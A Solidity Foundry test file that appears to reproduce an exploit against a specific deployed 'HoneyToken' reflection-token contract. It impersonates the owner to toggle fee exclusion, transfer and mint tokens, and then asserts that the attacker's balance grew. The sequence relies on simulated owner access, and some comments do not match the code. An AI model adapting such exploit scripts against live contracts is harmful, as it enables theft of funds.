// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface honeyToken {
    function owner() external view returns (address);
    function mint(address account, uint256 amount) external;
    function decimals() external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function excludeAccount(address account) external;
    function includeAccount(address account) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate owner during exploit
        vm.label(TARGET, "HoneyToken");
        // Store initial balance for comparison
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the owner address
        address owner = honeyToken(TARGET).owner();

        // Step 1: Exclude attacker from fees
        vm.startPrank(owner);
        honeyToken(TARGET).excludeAccount(attacker);
        vm.stopPrank();

        // Step 2: Transfer initial tokens (no fees since excluded as recipient)
        vm.startPrank(owner);
        uint256 decimals = honeyToken(TARGET).decimals();
        uint256 initialTransfer = 1000 * (10 ** decimals);
        honeyToken(TARGET).transfer(attacker, initialTransfer);
        vm.stopPrank();

        // Check balance after transfer (as excluded account)
        uint256 balanceAsExcluded = IERC20(TARGET).balanceOf(attacker);
        console.log("Balance as excluded:", balanceAsExcluded);

        // Step 3: Include attacker back (so balance is in reflections)
        vm.startPrank(owner);
        honeyToken(TARGET).includeAccount(attacker);
        vm.stopPrank();

        // Check balance as included (reflection balance)
        uint256 balanceAsIncluded = IERC20(TARGET).balanceOf(attacker);
        console.log("Balance as included:", balanceAsIncluded);

        // Step 4: Mint large amount to decrease rate
        vm.startPrank(owner);
        uint256 mintAmount = 1_000_000_000 * (10 ** decimals);
        honeyToken(TARGET).mint(attacker, mintAmount);
        vm.stopPrank();

        // Final balance
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Final balance:", finalBalance);

        // Should be more than initial balance due to rate decrease
        assertGt(finalBalance, balanceAsIncluded, "Balance should increase after mint due to rate change");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
